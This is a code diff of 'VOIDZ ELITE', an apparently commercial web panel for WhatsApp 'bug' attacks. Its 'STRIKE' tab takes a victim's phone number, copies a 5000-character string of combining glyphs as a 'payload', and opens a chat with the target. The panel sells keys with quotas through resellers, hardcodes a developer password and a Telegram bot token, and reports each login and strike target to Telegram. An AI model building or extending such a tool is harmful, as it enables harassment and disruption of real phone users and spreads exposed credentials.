@@ -13,37 +13,38 @@
         #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
         
-        /* LOGIN */
+        /* LOGIN UI */
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 0 30px rgba(255,69,0,0.2); }
         
         /* DASHBOARD COMPONENTS */
         .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
         .active-tab { display: block; }
         
-        /* BIG BANNER */
-        .banner-container { width: 100%; height: 230px; border-radius: 15px; overflow: hidden; border: 2px solid var(--fire); position: relative; margin-bottom: 15px; box-shadow: 0 0 20px rgba(255, 69, 0, 0.2); }
+        /* BIG BANNER (FIXED SIZE) */
+        .banner-container { width: 100%; height: 230px; border-radius: 15px; overflow: hidden; border: 2px solid var(--fire); position: relative; margin-bottom: 15px; box-shadow: 0 0 20px rgba(255, 69, 0, 0.3); background: #000; }
         .banner-video { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }
         .banner-overlay { position: absolute; inset: 0; background: linear-gradient(transparent, rgba(0,0,0,1)); padding: 15px; display: flex; flex-direction: column; justify-content: flex-end; }
 
-        /* GRID STATS */
+        /* STAT CARDS */
         .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
         .stat-card { background: #080808; border: 1px solid #222; padding: 12px; border-radius: 10px; text-align: center; border-left: 3px solid var(--fire); }
         
-        /* MODAL (POPUP) SYSTEM */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
+        /* MODAL POPUP */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: #0a0a0a; border: 1px solid var(--fire); padding: 25px; border-radius: 15px; width: 100%; max-width: 320px; position: relative; box-shadow: 0 0 30px var(--fire); }
-        .close-modal { position: absolute; top: 10px; right: 15px; color: #fff; font-size: 20px; cursor: pointer; }
+        .close-modal { position: absolute; top: 10px; right: 15px; color: #fff; font-size: 24px; cursor: pointer; }
 
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 8px; font-family: 'Orbitron'; margin-top: 10px; }
-        .btn-outline { background: transparent; border: 1px solid #333; color: #fff; font-size: 10px; padding: 12px; border-radius: 8px; margin-top: 10px; width: 100%; transition: 0.3s; }
-        .btn-outline:active { border-color: var(--fire); color: var(--fire); }
-        .input-box { width: 100%; background: #000; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; border-radius: 8px; outline: none; font-size: 11px; }
+        /* BUTTONS */
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 8px; font-family: 'Orbitron'; margin-top: 10px; outline: none; }
+        .btn-outline { background: transparent; border: 1px solid #333; color: #fff; font-size: 10px; padding: 12px; border-radius: 8px; margin-top: 10px; width: 100%; }
+        .input-box { width: 100%; background: #000; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; border-radius: 8px; outline: none; font-size: 11px; text-align: center; }
 
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; justify-content: space-around; }
-        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; font-size: 8px; }
+        /* NAV */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; justify-content: space-around; align-items: center; }
+        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; font-size: 8px; flex: 1; }
         .nav-btn.active { color: var(--fire); }
-        marquee { color: var(--fire); font-size: 9px; margin-bottom: 10px; display: block; }
+        marquee { color: var(--fire); font-size: 9px; margin-bottom: 10px; display: block; border-bottom: 1px solid #111; padding-bottom: 5px; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -52,40 +53,40 @@
     <div id="modalGen" class="modal">
         <div class="modal-content">
             <span class="close-modal" onclick="_0xCloseModal('modalGen')">&times;</span>
-            <h3 style="color:var(--fire); font-size:12px; margin-bottom:15px; font-family:Orbitron;">GENERATE KEY</h3>
-            <input id="ni" class="input-box" placeholder="OPERATOR ID">
-            <input id="np" class="input-box" placeholder="ACCESS KEY">
+            <h3 style="color:var(--fire); font-size:12px; margin-bottom:15px; font-family:Orbitron;">GENERATE ACCESS</h3>
+            <input id="ni" class="input-box" placeholder="NEW OPERATOR ID">
+            <input id="np" class="input-box" placeholder="NEW ACCESS KEY">
             <select id="nt" class="input-box">
-                <option value="1_MONTH">1 MONTH</option>
-                <option id="optLifetime" value="LIFETIME">LIFETIME</option>
+                <option value="1_MONTH">DURATION: 1 MONTH</option>
+                <option id="optLifetime" value="LIFETIME">DURATION: LIFETIME</option>
             </select>
             <div id="roleAreaOwner">
                 <select id="nr" class="input-box" onchange="_0xToggleQ()">
                     <option value="member">ROLE: MEMBER</option>
                     <option value="reseller">ROLE: RESELLER</option>
                 </select>
-                <div id="qArea" style="display:none"><input id="nq" class="input-box" placeholder="SET QUOTA"></div>
+                <div id="qArea" style="display:none"><input type="number" id="nq" class="input-box" placeholder="SET QUOTA"></div>
             </div>
-            <button onclick="_0xGen()" class="btn-main">ACTIVATE</button>
+            <button onclick="_0xGen()" class="btn-main">ACTIVATE KEY</button>
         </div>
     </div>
 
     <div id="modalBan" class="modal">
         <div class="modal-content">
             <span class="close-modal" onclick="_0xCloseModal('modalBan')">&times;</span>
-            <h3 style="color:#f00; font-size:12px; margin-bottom:15px; font-family:Orbitron;">BAN OPERATOR</h3>
-            <input id="td" class="input-box" placeholder="OPERATOR ID TO BAN">
-            <button onclick="_0xBan()" class="btn-main" style="background:#f00; color:#fff;">TERMINATE ACCESS</button>
+            <h3 style="color:#f00; font-size:12px; margin-bottom:15px; font-family:Orbitron;">TERMINATE ACCESS</h3>
+            <input id="td" class="input-box" placeholder="TARGET ID">
+            <button onclick="_0xBan()" class="btn-main" style="background:#f00; color:#fff;">BAN OPERATOR</button>
         </div>
     </div>
 
     <div class="content-layer">
         <div id="loginPage">
             <div class="login-box">
-                <h2 style="color:var(--fire); font-family:Orbitron; margin-bottom:20px;" onclick="_0x5a2b()">VOIDZ ELITE</h2>
-                <input type="text" id="lUser" class="input-box" placeholder="ID">
-                <input type="password" id="lPass" class="input-box" placeholder="KEY">
-                <button onclick="_0x1f2c()" class="btn-main">IGNITE</button>
+                <h2 style="color:var(--fire); font-family:Orbitron; margin-bottom:20px; letter-spacing: 2px;" onclick="_0x5a2b()">VOIDZ ELITE</h2>
+                <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
+                <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
+                <button onclick="_0x1f2c()" class="btn-main" id="btnLog">IGNITE</button>
             </div>
         </div>
 
@@ -97,37 +98,62 @@
             <div id="tabATTACK" class="tab-content">
                 <h2 style="color:var(--fire); font-family:Orbitron; text-align:center; margin:20px 0;">STRIKE FORCE</h2>
                 <div style="background:#0a0a0a; padding:20px; border-radius:15px; border:1px solid #222;">
-                    <input type="text" id="targetBug" class="input-box" placeholder="TARGET (628...)">
+                    <input type="text" id="targetBug" class="input-box" placeholder="628xxxxxxxx">
                     <select id="bugLevel" class="input-box">
-                        <option value="ULTIMATE">ULTIMATE</option>
-                        <option value="SUPREME">SUPREME</option>
+                        <option value="ULTIMATE">ULTIMATE (5000 CHAR)</option>
+                        <option value="SUPREME">SUPREME (3000 CHAR)</option>
                     </select>
-                    <button class="btn-main" onclick="_0x9e3d()">EXECUTE</button>
+                    <button class="btn-main" onclick="_0x9e3d()">EXECUTE STRIKE</button>
                 </div>
             </div>
         </div>
 
         <nav id="bottomNav" class="bottom-nav">
-            <div class="nav-btn active" onclick="_0x3c4e('home', this)"><i class="fas fa-layer-group"></i><span>DASHBOARD</span></div>
-            <div class="nav-btn" onclick="_0x3c4e('attack', this)"><i class="fas fa-skull"></i><span>STRIKE</span></div>
+            <div class="nav-btn active" onclick="_0x3c4e('home', this)"><i class="fas fa-layer-group" style="font-size: 16px;"></i><span>DASHBOARD</span></div>
+            <div class="nav-btn" onclick="_0x3c4e('attack', this)"><i class="fas fa-skull" style="font-size: 16px;"></i><span>STRIKE</span></div>
         </nav>
     </div>
 
     <script>
-        const _0xCONF={t:"7217442382:AAFZQDin1j4QcsodvAXGzg5uWV4AGW_GSow",c:"7217442382",w:"6285718241306",s:"https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U"};
+        // MASTER CONFIG
+        const _0xCONF={
+            t:"7217442382:AAFZQDin1j4QcsodvAXGzg5uWV4AGW_GSow",
+            c:"7217442382",
+            w:"6285718241306",
+            s:"https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U",
+            m:" [ SYSTEM ONLINE ] — [ DATABASE SECURED ] — [ VOIDZ ELITE V1 ] "
+        };
+
         let _0x4f2a=localStorage.getItem('JB_KEY'), _0x1a2e=localStorage.getItem('JB_BIN'), DB={}, _0xCurID="";
 
+        // AUTH ENGINE
         async function _0x1f2c(){
             const u=document.getElementById('lUser').value.trim(), p=document.getElementById('lPass').value.trim();
-            if(u==='DEVELOPER'&&p==='70104884'){DB[u]={pw:p,role:'owner',quota:'∞',expired:'LIFETIME'}; return _0xStart(u,DB[u]);}
+            const b=document.getElementById('btnLog');
+            if(u==='DEVELOPER'&&p==='70104884'){
+                DB[u]={pw:p,role:'owner',quota:'∞',expired:'LIFETIME'}; 
+                return _0xStart(u,DB[u]);
+            }
+            if(!_0x4f2a || !_0x1a2e) return alert("Setup API via Secret Menu!");
+            b.innerText = "VERIFYING...";
             try {
                 const r=await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}/latest`,{headers:{'X-Master-Key':_0x4f2a,'X-Bin-Meta':false}});
-                DB=await r.json(); if(DB[u]&&DB[u].pw===p)_0xStart(u,DB[u]); else alert("INVALID!");
-            } catch(e){alert("DB ERROR!");}
+                DB=await r.json(); 
+                if(DB[u]&&DB[u].pw===p){
+                    _0xStart(u,DB[u]);
+                } else {
+                    alert("ACCESS DENIED!"); b.innerText = "IGNITE";
+                }
+            } catch(e){ alert("DB OFFLINE!"); b.innerText = "IGNITE"; }
         }
 
         function _0xStart(id,data){
-            _0xCurID=id; document.getElementById('loginPage').style.display='none'; document.getElementById('mainApp').style.display='block'; document.getElementById('bottomNav').style.display='flex'; _0xRender();
+            _0xCurID=id; 
+            document.getElementById('loginPage').style.display='none'; 
+            document.getElementById('mainApp').style.display='block'; 
+            document.getElementById('bottomNav').style.display='flex'; 
+            _0xRender();
+            _0xtele(`👑 <b>Login Detected</b>\n👤 ID: <code>${id}</code>\n🎭 Role: ${data.role}`);
         }
 
         function _0xRender(){
@@ -135,54 +161,94 @@
             if(!DB.stats)DB.stats={total:0,logs:[]};
             let h=`
                 <div class="banner-container">
-                    <video autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video>
+                    <video id="vdb" autoplay loop muted playsinline class="banner-video">
+                        <source src="dashboard.mp4" type="video/mp4">
+                    </video>
                     <div class="banner-overlay">
-                        <div style="font-size:12px; font-weight:900; font-family:Orbitron;">VOIDZ ELITE V1</div>
-                        <div style="font-size:8px; color:#aaa;">ID: ${_0xCurID.toUpperCase()} | ROLE: ${d.role.toUpperCase()}</div>
+                        <div style="font-size:14px; font-weight:900; font-family:Orbitron; color:var(--fire);">VOIDZ ELITE V1</div>
+                        <div style="font-size:8px; color:#aaa;">OPERATOR: ${_0xCurID.toUpperCase()} | ROLE: ${d.role.toUpperCase()}</div>
                     </div>
                 </div>
-                <marquee>SYSTEM ONLINE - SECURED BY VOIDZ DATABASE - WELCOME BACK OPERATOR</marquee>
+                <marquee>${_0xCONF.m}</marquee>
                 <div class="stat-grid">
-                    <div class="stat-card"><div style="font-size:7px;color:#666;">GLOBAL STRIKE</div><div style="color:var(--fire);font-weight:900;">${DB.stats.total}</div></div>
-                    <div class="stat-card"><div style="font-size:7px;color:#666;">YOUR QUOTA</div><div style="color:#0f0;font-weight:900;">${d.quota}</div></div>
+                    <div class="stat-card"><div style="font-size:7px;color:#666;">GLOBAL STRIKE</div><div style="color:var(--fire);font-weight:900;font-size:14px;">${DB.stats.total}</div></div>
+                    <div class="stat-card"><div style="font-size:7px;color:#666;">YOUR QUOTA</div><div style="color:#0f0;font-weight:900;font-size:14px;">${d.quota}</div></div>
                 </div>
                 ${(isO||isR)?`
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-                    <button class="btn-outline" onclick="_0xOpenModal('modalGen')"><i class="fas fa-plus"></i> GENERATE KEY</button>
+                    <button class="btn-outline" onclick="_0xOpenModal('modalGen')"><i class="fas fa-plus-circle"></i> GENERATE KEY</button>
                     ${isO?`<button class="btn-outline" onclick="_0xOpenModal('modalBan')"><i class="fas fa-user-slash"></i> BAN USER</button>`:''}
                 </div>`:''}
-                <div style="margin-top:15px; background:#080808; padding:10px; border-radius:10px; font-size:8px; border:1px solid #111;">
-                    <div style="color:var(--fire); margin-bottom:5px;">[ SYSTEM ACTIVITIES ]</div>
-                    ${DB.stats.logs.map(l=>`<div>> ${l.u} striked ${l.t.slice(0,8)}...</div>`).join('')}
+                <div style="margin-top:15px; background:#080808; padding:12px; border-radius:12px; font-size:8px; border:1px solid #111;">
+                    <div style="color:var(--fire); margin-bottom:8px; font-weight:bold;">[ LIVE SYSTEM LOGS ]</div>
+                    ${DB.stats.logs.map(l=>`<div>> ${l.u} striked ${l.t.slice(0,10)}...</div>`).join('')}
                 </div>`;
             document.getElementById('renderHome').innerHTML=h;
-            // Sinkronisasi Durasi Reseller
-            if(!isO && d.expired !== 'LIFETIME') document.getElementById('optLifetime').style.display = 'none';
-            if(!isO) document.getElementById('roleAreaOwner').style.display = 'none';
+            
+            // Force Play Video
+            const v = document.getElementById('vdb');
+            if(v) v.play().catch(()=>{});
+
+            // Sinkronisasi Izin Modal
+            if(!isO){
+                document.getElementById('roleAreaOwner').style.display = 'none';
+                if(d.expired !== 'LIFETIME') document.getElementById('optLifetime').style.display = 'none';
+            }
         }
 
+        // MODAL LOGIC
         function _0xOpenModal(id){document.getElementById(id).style.display='flex';}
         function _0xCloseModal(id){document.getElementById(id).style.display='none';}
         function _0xToggleQ(){document.getElementById('qArea').style.display=document.getElementById('nr').value==='reseller'?'block':'none';}
 
         async function _0xGen(){
-            const i=document.getElementById('ni').value.toLowerCase().trim(), p=document.getElementById('np').value, t=document.getElementById('nt').value, r=document.getElementById('nr').value, q=document.getElementById('nq').value||"50";
-            if(!i||!p)return; DB[i]={pw:p,role:r,quota:(r==='reseller'?q:"50"),expired:t,by:_0xCurID};
-            await _0xSave(); alert("DONE!"); _0xCloseModal('modalGen'); _0xRender();
+            const i=document.getElementById('ni').value.toLowerCase().trim(), p=document.getElementById('np').value, t=document.getElementById('nt').value, r=document.getElementById('nr').value, q=document.getElementById('nq').value||"100";
+            if(!i||!p) return alert("Fill all fields!");
+            if(DB[i]) return alert("ID Exists!");
+            DB[i]={pw:p, role:r, quota:(r==='reseller'?q:"100"), expired:t, by:_0xCurID};
+            await _0xSave(); alert("ACCOUNT ACTIVATED!"); _0xCloseModal('modalGen'); _0xRender();
+            _0xtele(`🎫 <b>New Key</b>\n👤 ID: <code>${i}</code>\n🎭 Role: ${r}\n⏳ Dur: ${t}`);
         }
 
         async function _0x9e3d(){
-            const t=document.getElementById('targetBug').value; if(!t||(DB[_0xCurID].quota!=='∞'&&parseInt(DB[_0xCurID].quota)<=0))return alert("QUOTA EMPTY!");
-            let v=Array(5000).fill("҉").join(""); const el=document.createElement("textarea"); document.body.appendChild(el); el.value=v; el.select(); document.execCommand("copy"); document.body.removeChild(el);
+            const t=document.getElementById('targetBug').value.trim(); 
+            if(!t||(DB[_0xCurID].quota!=='∞'&&parseInt(DB[_0xCurID].quota)<=0)) return alert("QUOTA EMPTY!");
+            let v=Array(5000).fill("҉").join(""); 
+            const el=document.createElement("textarea"); document.body.appendChild(el); el.value=v; el.select(); document.execCommand("copy"); document.body.removeChild(el);
             if(DB[_0xCurID].quota!=='∞')DB[_0xCurID].quota=(parseInt(DB[_0xCurID].quota)-1).toString();
             DB.stats.total+=1; DB.stats.logs.unshift({u:_0xCurID,t:t}); if(DB.stats.logs.length>5)DB.stats.logs.pop();
-            await _0xSave(); window.open(`https://wa.me/${t.replace(/\D/g,'')}`); _0xRender();
+            await _0xSave(); 
+            _0xtele(`🚀 <b>Strike!</b>\n👤 By: ${_0xCurID}\n🎯 Target: ${t}`);
+            alert("PAYLOAD COPIED!"); window.open(`https://wa.me/${t.replace(/\D/g,'')}`); _0xRender();
         }
 
-        async function _0xBan(){const i=document.getElementById('td').value.toLowerCase(); if(DB[i]){delete DB[i]; await _0xSave(); alert("BANNED!"); _0xCloseModal('modalBan'); _0xRender();}}
-        async function _0xSave(){await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}`,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':_0x4f2a},body:JSON.stringify(DB)});}
-        function _0x3c4e(t,e){document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); e.classList.add('active');}
-        function _0x5a2b(){cl++;if(cl===3){const k=prompt("K"),b=prompt("B");if(k&&b){localStorage.setItem('JB_KEY',k);localStorage.setItem('JB_BIN',b);location.reload();}}} let cl=0;
+        async function _0xBan(){
+            const i=document.getElementById('td').value.toLowerCase().trim(); 
+            if(i==='developer') return alert("Master ID!");
+            if(DB[i]){delete DB[i]; await _0xSave(); alert("BANNED!"); _0xCloseModal('modalBan'); _0xRender();}
+        }
+
+        async function _0xSave(){
+            await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}`,{
+                method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':_0x4f2a}, body:JSON.stringify(DB)
+            });
+        }
+
+        function _0x3c4e(t,e){
+            document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active-tab')); 
+            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
+            document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); e.classList.add('active');
+        }
+
+        // SECRET SETUP
+        let cl=0; function _0x5a2b(){cl++; if(cl===3){const k=prompt("API Key:"),b=prompt("Bin ID:"); if(k&&b){localStorage.setItem('JB_KEY',k); localStorage.setItem('JB_BIN',b); location.reload();}}}
+        function _0xtele(m){fetch(`https://api.telegram.org/bot${_0xCONF.t}/sendMessage?chat_id=${_0xCONF.c}&text=${encodeURIComponent(m)}&parse_mode=html`);}
+
+        // ASH PARTICLES
+        const cvs=document.getElementById('ash-canvas'); const ctx=cvs.getContext('2d'); let pt=[];
+        function init(){cvs.width=window.innerWidth;cvs.height=window.innerHeight;pt=[];for(let i=0;i<30;i++)pt.push({x:Math.random()*cvs.width,y:Math.random()*cvs.height,s:Math.random()*2,d:Math.random()*0.5});}
+        function anim(){ctx.clearRect(0,0,cvs.width,cvs.height);ctx.fillStyle="rgba(255,255,255,0.2)";pt.forEach(p=>{ctx.beginPath();ctx.arc(p.x,p.y,p.s,0,Math.PI*2);ctx.fill();p.y-=p.d;if(p.y<0)p.y=cvs.height;});requestAnimationFrame(anim);}
+        init(); anim();
     </script>
 </body>
 </html>
